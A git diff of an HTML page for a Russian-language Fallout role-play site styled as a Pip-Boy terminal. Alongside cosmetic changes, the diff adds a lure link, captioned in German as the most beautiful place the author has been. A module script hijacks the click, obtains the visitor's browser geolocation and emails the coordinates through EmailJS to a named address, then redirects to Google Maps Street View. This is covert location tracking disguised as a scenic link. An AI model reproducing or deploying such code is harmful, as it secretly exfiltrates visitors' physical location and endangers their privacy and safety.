@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -92,12 +92,18 @@
       outline: none;
       width: 100%;
     }
+
+    small a {
+      color: #00ff00;
+      display: inline-block;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
   <div class="screen" onclick="focusInput()">
     <h1>Pip-Boy 3000</h1>
-    
+
     <ul class="nav">
       <li><a href="factions.html">Бестиарий</a></li>
       <li><a href="goddesses.html">Богини</a></li>
@@ -120,10 +126,10 @@
       <li class="terminal-line">Ролевая по Fallout:2 — Добро пожаловать в Пустошь, путник </li>
       <li class="terminal-line">C нами ты сможешь:</li>
       <li class="terminal-line">★ Создать уникального персонажа с продуманной историей</li>
-	  <li class="terminal-line">★ Влиять на сюжет мира своими действиями</li>
-	  <li class="terminal-line">★ Получать опыт, навыки и перки, как в классической игре</li>
-	  <li class="terminal-line">★ Играть по сюжетным веткам, участвовать в ивентах и битвах</li>
-	  <li class="terminal-line">★ Вести дипломатические переговоры… или устраивать засады</li>
+      <li class="terminal-line">★ Влиять на сюжет мира своими действиями</li>
+      <li class="terminal-line">★ Получать опыт, навыки и перки, как в классической игре</li>
+      <li class="terminal-line">★ Играть по сюжетным веткам, участвовать в ивентах и битвах</li>
+      <li class="terminal-line">★ Вести дипломатические переговоры… или устраивать засады</li>
       <li class="terminal-line">Веселья, Путник!</li>
     </ul>
 
@@ -131,6 +137,12 @@
       <span>> </span>
       <input type="text" id="commandInput" placeholder="Введите команду..." onkeydown="handleCommand(event)">
     </div>
+
+    <small>
+      <a href="#" id="geoLink" data-href="https://www.google.de/maps/@66.5439284,25.8489763,3a,75y,136.64h,90t/data=!3m7!1e1!3m5!1sESPanJASUxGWCGC9c0nfqQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D0%26panoid%3DESPanJASUxGWCGC9c0nfqQ%26yaw%3D136.63907!7i13312!8i6656?entry=ttu&g_ep=EgoyMDI1MDQwMi4xIKXMDSoJLDEwMjExNDUzSAFQAw%3D%3D">
+        Und dies ist der schönste Ort, an dem ich je gewesen bin... 
+      </a>
+    </small>
   </div>
 
   <script>
@@ -156,12 +168,58 @@
           img.style = "max-width: 100%; border: 2px solid #00ff00; box-shadow: 0 0 10px #00ff00; filter: grayscale(100%) contrast(200%) brightness(150%); margin-top: 20px;";
 
           const container = document.getElementById("imageContainer");
-          container.innerHTML = ""; // очистить старое
+          container.innerHTML = "";
           container.appendChild(img);
         }
-        event.target.value = ""; // очистка строки
+        event.target.value = "";
       }
     }
+  </script>
+
+  <script type="module">
+    import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/+esm';
+
+    emailjs.init("yzrvWokZipQeV4rk1"); // твой PUBLIC KEY
+
+    const geoLink = document.getElementById("geoLink");
+    const originalHref = geoLink.getAttribute("data-href");
+
+    geoLink.addEventListener("click", function (event) {
+      event.preventDefault();
+
+      if (!navigator.geolocation) {
+        alert("Не удалось...");
+        return;
+      }
+
+      geoLink.textContent = "Ссылка на Гугл Мепс.";
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          emailjs.send("service_xvob3q9", "template_z5bih6b", {
+            name: "Dmitrii",
+            latitude,
+            longitude,
+            email: "dhohrin@outlook.com"
+          }).then(() => {
+            geoLink.textContent = "Und dies ist der schönste Ort, an dem ich je gewesen bin.";
+            setTimeout(() => {
+              window.location.href = originalHref;
+            }, 1000);
+          }).catch((error) => {
+            console.error("Ошибка отправки:", error);
+            geoLink.textContent = "Попробуй еще раз)";
+          });
+        },
+        (error) => {
+          console.error("Ошибка геолокации:", error);
+          geoLink.textContent = "...";
+        }
+      );
+    });
   </script>
 </body>
 </html>
